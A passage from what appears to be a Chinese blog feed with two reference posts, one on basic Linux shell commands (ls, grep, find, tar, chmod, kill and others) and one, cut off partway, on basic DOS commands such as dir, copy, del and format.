        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Linux在渗透测试和安全运维的工作中都会经常使用，但是命令太多，作为一个普通的人类是不可能全部都记住的。所以在这里整理一个Linux命令的文档来方便自己日后查看。</p><a id="more"></a><h1 id="0x01-基础命令"><a href="#0x01-基础命令" class="headerlink" title="0x01 基础命令"></a>0x01 基础命令</h1><h2 id="1-1-cd命令"><a href="#1-1-cd命令" class="headerlink" title="1.1 cd命令"></a>1.1 cd命令</h2><p>这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/Docements <span class="comment"># 切换到目录/root/Docements  </span></span><br><span class="line"><span class="built_in">cd</span> ./path          <span class="comment"># 切换到当前目录下的path目录中，“.”表示当前目录   </span></span><br><span class="line"><span class="built_in">cd</span> ../path         <span class="comment"># 切换到上层目录中的path目录中，“..”表示上一层目录</span></span><br></pre></td></tr></table></figure><h2 id="1-2-ls命令"><a href="#1-2-ls命令" class="headerlink" title="1.2 ls命令"></a>1.2 ls命令</h2><p>这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l ：列出长数据串，包含文件的属性与权限数据等  </span><br><span class="line">-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用） </span><br><span class="line">-d ：仅列出目录本身，而不是列出目录的文件数据  </span><br><span class="line">-h ：将文件容量以较易读的方式（GB，kB等）列出来  </span><br><span class="line">-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来</span><br></pre></td></tr></table></figure><p>注：这些参数也可以组合使用，下面举两个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l  #以长数据串的形式列出当前目录下的数据文件和目录  </span><br><span class="line">ls -lR #以长数据串的形式列出当前目录下的所有文件</span><br></pre></td></tr></table></figure><h2 id="1-3-grep命令"><a href="#1-3-grep命令" class="headerlink" title="1.3 grep命令"></a>1.3 grep命令</h2><p>该命令常用于分析一行的信息，若当中有我们所需要的信息，就将该行显示出来，该命令通常与管道命令一起使用，用于对一些命令的输出进行筛选加工等等.</p><p>简单语法:</p><blockquote><p>grep [-acinv] [–color=auto] ‘查找字符串’ filename</p></blockquote><p>它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-a ：将binary文件以text文件的方式查找数据</span><br><span class="line">-c ：计算找到‘查找字符串’的次数</span><br><span class="line">-i ：忽略大小写的区别，即把大小写视为相同</span><br><span class="line">-v ：反向选择，即显示出没有‘查找字符串’内容的那一行</span><br><span class="line"># 例如：</span><br><span class="line"># 取出文件/etc/man.config中包含MANPATH的行，并把找到的关键字加上颜色</span><br><span class="line">grep --color=auto &apos;MANPATH&apos; /etc/man.config</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 把ls -l的输出中包含字母file（不区分大小写）的内容输出</span><br><span class="line">ls -l | grep -i file</span><br></pre></td></tr></table></figure><h2 id="1-4-find命令"><a href="#1-4-find命令" class="headerlink" title="1.4 find命令"></a>1.4 find命令</h2><p>find是一个基于查找的功能非常强大的命令，相对而言，它的使用也相对较为复杂，参数也比较多，所以在这里将给把它们分类列出，它的基本语法如下：</p><blockquote><p>语法：find [PATH] [option] [action]  </p></blockquote><ol><li>与时间有关的参数：  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件；  </span><br><span class="line">-mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名；  </span><br><span class="line">-mtime -n : 列出在n天之内（含n天本身）被更改过的文件名；  </span><br><span class="line">-newer file : 列出比file还要新的文件名</span><br></pre></td></tr></table></figure><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /root -mtime 0 # 在当前目录下查找今天之内有改动的文件</span><br></pre></td></tr></table></figure><ol start="2"><li>与用户或用户组名有关的参数：  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-user name : 列出文件所有者为name的文件  </span><br><span class="line">-group name : 列出文件所属用户组为name的文件  </span><br><span class="line">-uid n : 列出文件所有者为用户ID为n的文件  </span><br><span class="line">-gid n : 列出文件所属用户组为用户组ID为n的文件</span><br></pre></td></tr></table></figure><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/ljianhui -user ljianhui # 在目录/home/ljianhui中找出所有者为ljianhui的文件</span><br></pre></td></tr></table></figure><ol start="3"><li>与文件权限及名称有关的参数：   </li></ol><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name passwd # 查找文件名为passwd的文件  </span><br><span class="line"></span><br><span class="line">find . -perm 0755 # 查找当前目录中文件权限的0755的文件  </span><br><span class="line"></span><br><span class="line">find . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte</span><br></pre></td></tr></table></figure><blockquote><p>语法：find [PATH] [option] [action]</p></blockquote><h2 id="1-5-cp命令"><a href="#1-5-cp命令" class="headerlink" title="1.5 cp命令"></a>1.5 cp命令</h2><p>该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下，它的常用参数如下：</p><blockquote><p>语法：[plain] <a href="http://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">view plain</a> <a href="http://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">copy</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-a ：将文件的特性一起复制  </span><br><span class="line"></span><br><span class="line">-p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份 </span><br><span class="line"></span><br><span class="line">-i ：若目标文件已经存在时，在覆盖时会先询问操作的进行  </span><br><span class="line"></span><br><span class="line">-r ：递归持续复制，用于目录的复制行为  </span><br><span class="line"></span><br><span class="line">-u ：目标文件与源文件有差异时才会复制</span><br></pre></td></tr></table></figure><p>​      例如 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2  </span><br><span class="line">cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中  </span><br><span class="line"></span><br><span class="line">cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2</span><br><span class="line"></span><br><span class="line">cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中</span><br></pre></td></tr></table></figure><h2 id="1-6-mv命令"><a href="#1-6-mv命令" class="headerlink" title="1.6 mv命令"></a>1.6 mv命令</h2><p>该命令用于移动文件、目录或更名，move之意，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖  </span><br><span class="line"></span><br><span class="line">-i ：若目标文件已经存在，就会询问是否覆盖  </span><br><span class="line"></span><br><span class="line">-u ：若目标文件已经存在，且比目标文件新，才会更新</span><br></pre></td></tr></table></figure><blockquote><p>PS：该命令可以把一个文件或多个文件一次移动一个文件夹中，但是最后一个目标文件一定要是“目录”。</p></blockquote><h2 id="1-7-rm命令"><a href="#1-7-rm命令" class="headerlink" title="1.7 rm命令"></a>1.7 rm命令</h2><p>该命令用于删除文件或目录，remove之间，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-f ：就是force的意思，忽略不存在的文件，不会出现警告消息  </span><br><span class="line"></span><br><span class="line">-i ：互动模式，在删除前会询问用户是否操作  </span><br><span class="line"></span><br><span class="line">-r ：递归删除，最常用于目录删除，它是一个非常危险的参数</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -i file # 删除文件file，在删除之前会询问是否进行该操作  </span><br><span class="line"></span><br><span class="line">rm -fr dir # 强制删除目录dir中的所有文件</span><br></pre></td></tr></table></figure><h2 id="1-8-ps命令"><a href="#1-8-ps命令" class="headerlink" title="1.8 ps命令"></a>1.8 ps命令</h2><p>该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A ：所有的进程均显示出来  </span><br><span class="line"></span><br><span class="line">-a ：不与terminal有关的所有进程  </span><br><span class="line"></span><br><span class="line">-u ：有效用户的相关进程  </span><br><span class="line"></span><br><span class="line">-x ：一般与a参数一起使用，可列出较完整的信息  </span><br><span class="line"></span><br><span class="line">-l ：较长，较详细地将PID的信息列出</span><br></pre></td></tr></table></figure><p>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps aux # 查看系统所有的进程数据  </span><br><span class="line"></span><br><span class="line">ps ax # 查看不与terminal有关的所有进程  </span><br><span class="line"></span><br><span class="line">ps -lA # 查看系统所有的进程数据  </span><br><span class="line"></span><br><span class="line">ps axjf # 查看连同一部分进程树状态</span><br></pre></td></tr></table></figure><h2 id="1-9-kill命令"><a href="#1-9-kill命令" class="headerlink" title="1.9 kill命令"></a>1.9 kill命令</h2><p>该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p><blockquote><p>语法：kill -signal PID</p></blockquote><p>signal的常用参数如下：</p><p>注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1：SIGHUP，启动被终止的进程  </span><br><span class="line"></span><br><span class="line">2：SIGINT，相当于输入ctrl+c，中断一个程序的进行  </span><br><span class="line"></span><br><span class="line">9：SIGKILL，强制中断一个进程的进行  </span><br><span class="line"></span><br><span class="line">15：SIGTERM，以正常的结束进程方式来终止进程  </span><br><span class="line"></span><br><span class="line">17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 以正常的结束进程方式来结束第一个后台工作，可用jobs命令查看后台中的第一个工作进程  </span><br><span class="line"></span><br><span class="line">kill -SIGTERM %1   </span><br><span class="line"></span><br><span class="line"># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进筛选获得  </span><br><span class="line"></span><br><span class="line">kill -SIGHUP PID</span><br></pre></td></tr></table></figure><h2 id="1-10-killall命令"><a href="#1-10-killall命令" class="headerlink" title="1.10 killall命令"></a>1.10 killall命令</h2><p>该命令用于向一个命令启动的进程发送一个信号</p><blockquote><p>语法：killall [-iIe] [command name]</p></blockquote><p>参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-i ：交互式的意思，若需要删除时，会询问用户</span><br><span class="line">-e ：表示后面接的command name要一致，但command name不能超过15个字符</span><br><span class="line">-I ：命令名称忽略大小写</span><br><span class="line"># 例如：</span><br><span class="line">killall -SIGHUP syslogd # 重新启动syslogd</span><br></pre></td></tr></table></figure><h2 id="1-11-file命令"><a href="#1-11-file命令" class="headerlink" title="1.11 file命令"></a>1.11 file命令</h2><p>该命令用于判断接在file命令后的文件的基本数据，因为在Linux下文件的类型并不是以后缀为分的，所以这个命令对我们来说就很有用了，它的用法非常简单，基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file filename</span><br><span class="line">#例如：</span><br><span class="line">file ./test</span><br></pre></td></tr></table></figure><p>##1.12 tar命令</p><p>该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-c ：新建打包文件</span><br><span class="line">-t ：查看打包文件的内容含有哪些文件名</span><br><span class="line">-x ：解打包或解压缩的功能，可以搭配-C（大写）指定解压的目录，注意-c,-t,-x不能同时出现在同一条命令中</span><br><span class="line">-j ：通过bzip2的支持进行压缩/解压缩</span><br><span class="line">-z ：通过gzip的支持进行压缩/解压缩</span><br><span class="line">-v ：在压缩/解压缩过程中，将正在处理的文件名显示出来</span><br><span class="line">-f filename ：filename为要处理的文件</span><br><span class="line">-C dir ：指定压缩/解压缩的目录dir</span><br></pre></td></tr></table></figure><p>虽然命令的参数很多，但是常用的只有3条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称</span><br><span class="line">查询：tar -jtv -f filename.tar.bz2</span><br><span class="line">解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</span><br></pre></td></tr></table></figure><blockquote><p>ps：文件名并不定要以后缀tar.bz2结尾，这里主要是为了说明使用的压缩程序为bzip2</p></blockquote><h2 id="1-13-cat命令"><a href="#1-13-cat命令" class="headerlink" title="1.13 cat命令"></a>1.13 cat命令</h2><p>该命令用于查看文本文件的内容，后接要查看的文件名，通常可用管道与more和less一起使用，从而可以一页页地查看数据。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat text | less # 查看text文件中的内容</span><br><span class="line"># 注：这条命令也可以使用less text来代替</span><br></pre></td></tr></table></figure><h2 id="1-14-chgrp命令"><a href="#1-14-chgrp命令" class="headerlink" title="1.14 chgrp命令"></a>1.14 chgrp命令</h2><p>该命令用于改变文件所属用户组，它的使用非常简单，它的基本用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-R] dirname/filename</span><br><span class="line">-R ：进行递归的持续对所有文件和子目录更改</span><br><span class="line"># 例如：</span><br><span class="line">chgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users</span><br></pre></td></tr></table></figure><h2 id="1-15-chown命令"><a href="#1-15-chown命令" class="headerlink" title="1.15 chown命令"></a>1.15 chown命令</h2><p>该命令用于改变文件的所有者，与chgrp命令的使用方法相同，只是修改的文件属性不同，不再详述。</p><h2 id="1-16-chmod命令"><a href="#1-16-chmod命令" class="headerlink" title="1.16 chmod命令"></a>1.16 chmod命令</h2><p>该命令用于改变文件的权限，一般的用法如下：</p><blockquote><p>语法：chmod [-R] xyz 文件或目录</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-R：进行递归的持续更改，即连同子目录下的所有文件都会更改</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 0755 file # 把file的文件权限改变为-rxwr-xr-x</span><br><span class="line">chmod g+w file # 向file的文件权限中加入用户组可写权限</span><br></pre></td></tr></table></figure><h2 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h2><h2 id="1-18-vim命令"><a href="#1-18-vim命令" class="headerlink" title="1.18 vim命令"></a>1.18 vim命令</h2><p>该命令主要用于文本编辑，它接一个或多个文件名作为参数，如果文件存在就打开，如果文件不存在就以该文件名创建一个文件。vim是一个非常好用的文本编辑器，它里面有很多非常好用的命令，在这里不再多说。你可以从这里下载<a href="http://download.csdn.net/detail/ljianhui/6215287" target="_blank" rel="noopener">vim常用操作</a>的详细说明。</p><h2 id="1-19-gcc命令"><a href="#1-19-gcc命令" class="headerlink" title="1.19 gcc命令"></a>1.19 gcc命令</h2><p>对于一个用Linux开发C程序的人来说，这个命令就非常重要了，它用于把C语言的源程序文件，编译成可执行程序，由于g++的很多参数跟它非常相似，所以这里只介绍gcc的参数，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-o ：output之意，用于指定生成一个可执行文件的文件名</span><br><span class="line">-c ：用于把源文件生成目标文件（.o)，并阻止编译器创建一个完整的程序</span><br><span class="line">-I ：增加编译时搜索头文件的路径</span><br><span class="line">-L ：增加编译时搜索静态连接库的路径</span><br><span class="line">-S ：把源文件生成汇编代码文件</span><br><span class="line">-lm：表示标准库的目录中名为libm.a的函数库</span><br><span class="line">-lpthread ：连接NPTL实现的线程库</span><br><span class="line">-std= ：用于指定把使用的C语言的版本</span><br><span class="line"> </span><br><span class="line"># 例如：</span><br><span class="line"># 把源文件test.c按照c99标准编译成可执行程序test</span><br><span class="line">gcc -o test test.c -lm -std=c99</span><br><span class="line">#把源文件test.c转换为相应的汇编程序源文件test.s</span><br><span class="line">gcc -S test.c</span><br></pre></td></tr></table></figure><h2 id="1-20-time命令"><a href="#1-20-time命令" class="headerlink" title="1.20 time命令"></a>1.20 time命令</h2><p>该命令用于测算一个命令（即程序）的执行时间。它的使用非常简单，就像平时输入命令一样，不过在命令的前面加入一个time即可，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">time ./process</span><br><span class="line">time ps aux</span><br></pre></td></tr></table></figure><p>在程序或命令运行结束后，在最后输出了三个时间，它们分别是：<br>user：用户CPU时间，命令执行完成花费的用户CPU时间，即命令在用户态中执行时间总和；<br>system：系统CPU时间，命令执行完成花费的系统CPU时间，即命令在核心态中执行时间总和；<br>real：实际时间，从command命令行开始执行到运行终止的消逝时间；</p><p>注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。</p><h1 id="0x02-转载链接"><a href="#0x02-转载链接" class="headerlink" title="0x02 转载链接"></a>0x02 转载链接</h1><p><a href="https://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">https://blog.csdn.net/ljianhui/article/details/11100625/</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础DOS命令</title>
      <link href="/2019/09/05/%E5%9F%BA%E7%A1%80DOS%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/09/05/%E5%9F%BA%E7%A1%80DOS%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，不免会用到DOS系统下的一些命令，所以这篇文章将常用的DOS命令进行整理归纳，方便他人学习和自己查看。</p><a id="more"></a><h1 id="0x01-常用命令归纳"><a href="#0x01-常用命令归纳" class="headerlink" title="0x01 常用命令归纳"></a>0x01 常用命令归纳</h1><h2 id="1-1-dir"><a href="#1-1-dir" class="headerlink" title="1.1 dir"></a>1.1 dir</h2><p>dir是英文单词directory(目录）的缩写，主要用来显示一个目录下的文件和子目录。 </p><blockquote><p>[功能] 显示指定磁盘、目录中的文件和子目录信息，包括文件及子目录所在磁盘的卷标、文件与子目录的名称、每个文件的大小、文件及目录建立的日期时间，以及文件子目录的个数、所占用总字节数以及磁盘上的剩余总空间等信息。 </p></blockquote><blockquote><p>[格式] dir [C:][path][filename][.ext][/o][/s][/p][/w][/a] </p></blockquote><blockquote><p>[说明] dir是DOS命令中最常用的一个。斜杠表示后面的内容是参数。DOS参数最常用的是以下四个：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">参 数 意 义 :</span><br><span class="line">/p </span><br><span class="line">显示信息满一屏时，暂停显示，按任意键后显示下一屏 </span><br><span class="line"></span><br><span class="line">/o </span><br><span class="line">排序显示。o后面可以接不同意义的字母 </span><br><span class="line"></span><br><span class="line">/w </span><br><span class="line">只显示文件名目录名，每行五个文件名。即宽行显示 </span><br><span class="line"></span><br><span class="line">/s </span><br><span class="line">将目录及子目录的全部目录文件都显示 </span><br><span class="line">/a </span><br><span class="line">显示隐藏文件</span><br></pre></td></tr></table></figure><blockquote><p>[举例] 显示C:\WINDOWS\Desktop文件夹里面的信息 </p></blockquote><h2 id="1-2-md"><a href="#1-2-md" class="headerlink" title="1.2 md"></a>1.2 md</h2><p>md是英文make directory（创建目录）的缩写 </p><blockquote><p>[功能] 创建一个子目录 </p></blockquote><blockquote><p>[格式] md [C:]path </p></blockquote><blockquote><p>[举例] 用md 建立一个叫做purple的目录 </p></blockquote><h2 id="1-3-cd"><a href="#1-3-cd" class="headerlink" title="1.3 cd"></a>1.3 cd</h2><p>cd是英文change directory(改变目录）的缩写 </p><blockquote><p>[功能] 改变或显示当前目录 </p></blockquote><blockquote><p>[格式] cd [C:][path] </p></blockquote><blockquote><p>[说明] 路径可以使用绝对路径和相对路径两种。如果只有cd而没有参数，则只显示当前路径。注意：子目录中一定有两个“特殊目录”，即“.”“..”，其中一点表示当前目录，两点表示上一层目录。从简单实用的角度来看，我们只要学会逐层进入（cd 下一层某目录名），和逐层退出（cd..）就可以解决所有问题。当然也可以用绝对路径的办法。 </p></blockquote><blockquote><p>[举例] 进入我们刚才建立的purple目录 </p></blockquote><h2 id="1-4-rd"><a href="#1-4-rd" class="headerlink" title="1.4 rd"></a>1.4 rd</h2><p>remove directory–删除目录 </p><blockquote><p>[功能] 删除空子目录 </p></blockquote><blockquote><p>[格式] rd [d:]path </p></blockquote><blockquote><p>[说明] rd是专门删除空子目录的命令。注意两条：一是不能删除非空目录；二是不能删除当前目录。 </p></blockquote><blockquote><p>[举例] 用rd删除purple这个目录 </p></blockquote><p>下面我们来运用md, cd, rd这三个命令。 </p><h2 id="1-5-copy"><a href="#1-5-copy" class="headerlink" title="1.5 copy"></a>1.5 copy</h2><p>copy在英文中是复制的意思 </p><blockquote><p>[功能] 复制一个或一组文件到指定的磁盘或目录中 </p></blockquote><blockquote><p>[格式] copy [C:][path][filename.ext] [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] 复制文件命令基本用法是：“复制 源文件名 目标文件名”。如果只写目标路径而不写目标文件名，表示同名复制；否则称为换名复制。注意换名复制一般不要更改文件扩展名。 </p></blockquote><blockquote><p>[举例] 将C:\purple目录的所有文件复制到软盘，可以打如下命令，请注意当前盘与当前路径不同： </p></blockquote><p>C:&gt;copy purple A:\ </p><p>如果目标盘上已有同名文件，会出现如下提示，“Overwrite xxxx(Yes/No/All)”此时回答Y则覆盖当前文件，N则保留，A则覆盖此后的所有文件而不再提问。 </p><h2 id="1-6-del"><a href="#1-6-del" class="headerlink" title="1.6 del"></a>1.6 del</h2><p>del是英文delete（删除）的缩写 </p><blockquote><p>[功能] 删除指定磁盘、目录中的一个或一组文件 </p></blockquote><blockquote><p>[格式] del [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] 这个命令应小心使用。一旦被删除，将不易恢复。同样可以采用通配符为删除一类文件。当利用<em>.</em>时，为了安全将给出警告，确定方进行删除工作。删除过程如没有信息提示，表示已正确删除。 </p></blockquote><p>注意这个命令不能删除具有只读、隐含、系统属性的文件；如果指定文件不存在，则出现“File not found”的提示；DOS对误删除的文件可以用UNDELETE外部命令恢复；它<strong>只能删文件，不能删目录</strong>。 </p><h2 id="1-7-ren"><a href="#1-7-ren" class="headerlink" title="1.7 ren"></a>1.7 ren</h2><p>ren是英文rename（重新命名）的简写 </p><blockquote><p>[功能] 对指定磁盘、目录中的一个文件或一组文件更改名称 </p></blockquote><blockquote><p>[格式] ren [C:][path]filename1[.ext] filename2[.ext] </p></blockquote><blockquote><p>[说明] 改名操作只限于某个文件某组文件的名称，它不会更改文件所在的目录。 </p></blockquote><p>如果使用了通配符，则对一批文件进行更名。 </p><h2 id="1-8-type"><a href="#1-8-type" class="headerlink" title="1.8 type"></a>1.8 type</h2><blockquote><p>[功能] 在屏幕上显示文本文件内容命令 </p></blockquote><blockquote><p>[格式] type [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] type命令用来在屏幕上快速、简便地显示文本文件的内容，扩展名为TXT的文件是文本文件。 </p></blockquote><p>如果用这个命令显示扩展名为EXE或COM等其它文件， 输出的结果往往是一些乱七八糟的符号并伴有无规则的响铃声，有时甚至会出现死机现象。 </p><h2 id="1-9-format"><a href="#1-9-format" class="headerlink" title="1.9 format"></a>1.9 format</h2><blockquote><p>[功能] 磁盘格式化 </p></blockquote><blockquote><p>[格式] [C:][path]format drive:[/S] </p></blockquote><blockquote><p>[说明] 厂家制造的各种磁盘可用来存储各种操作系统下的文件。不同操作系统的磁盘格式一般是不相同的，是不通用的。format命令就是使一个新的磁盘可以被DOS操作系统识别，即可存储DOS文件。 </p></blockquote><p>这个命令对磁盘的格式化过程，实际上是用DOS规定的信息存储格式对磁盘进行规划的过程。格式化磁盘时，要清除磁盘上已经存在的所有数据，在磁盘上写上引导记录，划分出文件分配表和根目录，同时，它还要找出磁盘上的所有坏扇区并作上不可使用的标记。命令参数我们这里只列出了一个：/S。当使用了这个参数后，磁盘格式化并装入操作系统文件，使之变成引导盘。相当于format后再进行下一命令：SYS。 </p><h2 id="1-10-discopy"><a href="#1-10-discopy" class="headerlink" title="1.10 discopy"></a>1.10 discopy</h2><p>diskcopy，翻译成中文就是磁盘复制 </p><blockquote><p>[功能] 复制出一个和原来磁盘内容一模一样的磁盘 </p></blockquote><blockquote><p>[格式] diskcopy　源驱动器名　目的驱动器名 </p></blockquote><blockquote><p>[说明] 它的主要用途就是用来备份。比如我们的电脑在刚买来时，会随机附带一些设备驱动程序磁盘，这些驱动程序在以后都有可能用到，为防止这些磁盘的损坏，一定要将它们都备份一套，这时，使用diskcopy命令是比较快捷和方便的。 </p></blockquote><h2 id="1-11-deltree"><a href="#1-11-deltree" 